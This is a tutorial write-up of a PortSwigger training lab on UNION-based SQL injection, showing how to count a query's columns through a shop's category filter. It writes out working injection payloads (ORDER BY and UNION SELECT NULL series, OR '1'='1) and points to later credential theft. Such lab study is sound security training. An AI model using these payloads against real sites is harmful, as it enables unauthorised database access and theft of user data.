# Lab 3: SQL Injection UNION Attack — Determining Number of Columns

> **Platform:** PortSwigger Web Security Academy  
> **Lab:** SQL injection UNION attack, determining the number of columns returned by the query  
> **Difficulty:** Practitioner  
> **Vulnerability:** SQL Injection (UNION-based)

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [What You Need](#what-you-need)
3. [Step 1: Access the Lab & Find the Injection Point](#step-1-access-the-lab--find-the-injection-point)
4. [Step 2: Confirm SQL Injection Exists](#step-2-confirm-sql-injection-exists)
5. [Step 3: Confirm You Can Fix the Query](#step-3-confirm-you-can-fix-the-query)
6. [Step 4: Determine Column Count — ORDER BY Technique](#step-4-determine-column-count--order-by-technique)
7. [Step 5: Determine Column Count — UNION SELECT NULL Technique](#step-5-determine-column-count--union-select-null-technique)
8. [Why This Matters](#why-this-matters)
9. [Exact Burp Repeater Payloads](#exact-burp-repeater-payloads)
10. [Common Mistakes & Troubleshooting](#common-mistakes--troubleshooting)
11. [TWAHH Connection (Chapters 1–2)](#twahh-connection-chapters-12)
12. [References](#references)

---

## Lab Overview

The application uses your input in a `SELECT` query and displays the results. A `UNION` attack lets you extract data from other tables, but first you must match the number of columns in the original query.

When you click a product category (e.g., "Tech gifts" or "Accessories"), the backend runs a SQL query similar to:

```sql
SELECT * FROM products WHERE category = 'Accessories'
```

Your input (`Accessories`) is being **directly concatenated** into the SQL query without proper sanitization. This is the injection point.

**Your goal:** Figure out how many columns the original `SELECT` query returns, so that in future labs you can use `UNION` to pull data from other tables (like usernames and passwords).

---

## What You Need

| Tool | Purpose |
|------|---------|
| **Burp Suite Community Edition** (free) | Intercept and modify HTTP requests using **Repeater** |
| **Browser** (Firefox/Chrome) | Navigate the lab |
| **Burp Proxy** | Route browser traffic through Burp |
| **PortSwigger Lab URL** | Your unique lab instance |

---

## Step 1: Access the Lab & Find the Injection Point

1. Open the lab. You'll see a shopping page with product categories (e.g., "Tech gifts," "Accessories," "Food & Drink").
2. Click any category filter. Watch your browser's URL — it will look like:

```
https://<lab-id>.web-security-academy.net/filter?category=Tech+gifts
```

3. **This `category` parameter is your injection point.**

---

## Step 2: Confirm SQL Injection Exists

Before we count columns, we need to prove the parameter is injectable.

### In Burp Suite:

1. Go to **Proxy → HTTP History** and find the request where you clicked the category filter.
2. Right-click it → **Send to Repeater**.
3. In the **Repeater** tab, look at the request. Find this line:

```http
GET /filter?category=Tech+gifts HTTP/1.1
```

4. Change `Tech+gifts` to just a single quote: `Tech+gifts'`

**Send the request.**

### What happens?

You should get a **500 Internal Server Error**.

### Why?

Because the backend query became:

```sql
SELECT * FROM products WHERE category = 'Tech gifts''
```

That trailing single quote breaks the SQL syntax — the string never closes. The database throws an error, and the application returns a 500. This confirms the input is being used directly in the query.

---

## Step 3: Confirm You Can Fix the Query

Now inject something that makes the query valid again:

```
Tech gifts' OR '1'='1
```

Or URL-encoded in Burp:

```
Tech+gifts'+OR+'1'='1
```

### What happens?

The page returns **all products** across all categories, as if no filter was applied.

### Why?

The query becomes:

```sql
SELECT * FROM products WHERE category = 'Tech gifts' OR '1'='1'
```

Since `'1'='1'` is always true, the `WHERE` clause matches every row. This proves you can manipulate the query logic.

---

## Step 4: Determine Column Count — ORDER BY Technique

The idea: `ORDER BY N` sorts results by the Nth column. If `N` exceeds the actual number of columns, the database errors out.

### In Burp Repeater, modify the `category` parameter:

#### Payload 1:
```
Tech gifts' ORDER BY 1--
```
URL-encoded:
```
Tech+gifts'+ORDER+BY+1--
```
**Send → Expect: 200 OK** (page loads normally)

> The `--` is a SQL comment. It comments out everything after your injection (including the trailing single quote the application adds). The space after `--` is often required in some databases.

#### Payload 2:
```
Tech gifts' ORDER BY 2--
```
URL-encoded:
```
Tech+gifts'+ORDER+BY+2--
```
**Send → Expect: 200 OK**

#### Payload 3:
```
Tech gifts' ORDER BY 3--
```
URL-encoded:
```
Tech+gifts'+ORDER+BY+3--
```
**Send → Expect: 200 OK**

#### Payload 4:
```
Tech gifts' ORDER BY 4--
```
URL-encoded:
```
Tech+gifts'+ORDER+BY+4--
```
**Send → Expect: 500 Internal Server Error** (or "Unknown column" error)

### Deep Explanation: Why ORDER BY Works

The original query is something like:

```sql
SELECT col1, col2, col3 FROM products WHERE category = 'Tech gifts' ORDER BY 1--
```

| ORDER BY | Meaning | Result |
|----------|---------|--------|
| `ORDER BY 1` | Sort by 1st column | ✅ Works |
| `ORDER BY 2` | Sort by 2nd column | ✅ Works |
| `ORDER BY 3` | Sort by 3rd column | ✅ Works |
| `ORDER BY 4` | Sort by 4th column | ❌ Error — no 4th column |

**Conclusion: The original query returns exactly 3 columns.**

---

## Step 5: Determine Column Count — UNION SELECT NULL Technique

`UNION` combines the results of two `SELECT` statements, but **both must have the same number of columns**. We can use this property to discover the column count by trial and error.

We use `NULL` because `NULL` is compatible with **every data type** (string, integer, date, etc.). If we used a string like `'a'` and the column expected an integer, we'd get a type mismatch error even if the column count was right.

### In Burp Repeater:

#### Payload 1 (1 NULL):
```
Tech gifts' UNION SELECT NULL--
```
URL-encoded:
```
Tech+gifts'+UNION+SELECT+NULL--
```
**Send → Expect: 500 Error**

> The database says something like: *"All queries combined using a UNION must have an equal number of expressions in their target lists."*

#### Payload 2 (2 NULLs):
```
Tech gifts' UNION SELECT NULL,NULL--
```
URL-encoded:
```
Tech+gifts'+UNION+SELECT+NULL,NULL--
```
**Send → Expect: 500 Error**

#### Payload 3 (3 NULLs):
```
Tech gifts' UNION SELECT NULL,NULL,NULL--
```
URL-encoded:
```
Tech+gifts'+UNION+SELECT+NULL,NULL,NULL--
```
**Send → Expect: 200 OK** ✅

The page loads successfully. You might even see an extra blank row in the product table (the `UNION` added a row of `NULL` values).

#### Payload 4 (4 NULLs):
```
Tech gifts' UNION SELECT NULL,NULL,NULL,NULL--
```
URL-encoded:
```
Tech+gifts'+UNION+SELECT+NULL,NULL,NULL,NULL--
```
**Send → Expect: 500 Error**

### Deep Explanation: Why UNION SELECT NULL Works

The backend query with your payload becomes:

```sql
SELECT col1, col2, col3 FROM products WHERE category = 'Tech gifts'
UNION
SELECT NULL, NULL, NULL--
```

| UNION SELECT | Columns | Result |
|--------------|---------|--------|
| `SELECT NULL` | 1 | ❌ Column count mismatch → Error |
| `SELECT NULL, NULL` | 2 | ❌ Mismatch → Error |
| `SELECT NULL, NULL, NULL` | 3 | ✅ Match → Success! |
| `SELECT NULL, NULL, NULL, NULL` | 4 | ❌ Mismatch → Error |

**Conclusion: 3 columns.** The lab will show the **"Congratulations, you solved the lab!"** banner.

---

## Why This Matters

This lab is **foundational** for every `UNION`-based SQL injection attack that follows.

| What You Learned | Why It's Critical |
|---|---|
| Column count = 3 | Every future `UNION` payload you write MUST have exactly 3 expressions |
| `NULL` is type-agnostic | You don't need to guess data types while counting columns |
| `ORDER BY` technique | Works even when `UNION` is blocked or the app swallows errors |
| `--` comments out the rest | Prevents syntax errors from the application's trailing quote |

In the **next lab**, you'll build on this by replacing one of those `NULL`s with a string like `'abc'` to find which column can display text data. Then you'll replace it with `username, password FROM users` to steal credentials.

---

## Exact Burp Repeater Payloads

For copy-paste convenience:

### ORDER BY Method
```
Tech+gifts'+ORDER+BY+1--
Tech+gifts'+ORDER+BY+2--
Tech+gifts'+ORDER+BY+3--
Tech+gifts'+ORDER+BY+4--    ← Error here = 3 columns
```

### UNION SELECT Method
```
Tech+gifts'+UNION+SELECT+NULL--           ← Error
Tech+gifts'+UNION+SELECT+NULL,NULL--      ← Error
Tech+gifts'+UNION+SELECT+NULL,NULL,NULL-- ← 200 OK = 3 columns
```

---

## Common Mistakes & Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| `ORDER BY 1--` gives 500 | Missing space after `--` | Use `-- ` (note the space) or `--+` |
| `UNION SELECT` gives 500 even with right count | Database requires `UNION ALL` or specific syntax | Try `' UNION ALL SELECT NULL,NULL,NULL--` |
| Page looks identical for all payloads | The app might be swallowing errors | Look at response length in Burp — 200 vs 500 often have different byte sizes |
| Getting "illegal mix of collations" | MySQL collation mismatch | Try `UNION SELECT NULL,NULL,NULL#` (using `#` instead of `--`) |
| Lab not showing "solved" | Make sure you're using the correct number of NULLs | Verify with both ORDER BY and UNION methods |

---

## TWAHH Connection (Chapters 1–2)

From *The Web Application Hacker's Handbook*:

> **"The same-origin policy is a browser security model, not an application security model."**

This lab perfectly illustrates that. The browser did its job — it sent your request faithfully. The **application** failed to validate input before passing it to the database. The vulnerability is entirely server-side. The application must enforce its own security; it cannot rely on the browser.

### Key Takeaways from TWAHH Chapters 1–2:

- Web apps are everywhere and hold massive value (data, money, identity).
- Custom code + complex frameworks = vast attack surface.
- Applications must enforce their own security — the browser's same-origin policy does not protect the server.

---

## References

- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
- *The Web Application Hacker's Handbook* (2nd Edition) — Dafydd Stuttard & Marcus Pinto

---

*Happy Hacking! 🐱‍💻*
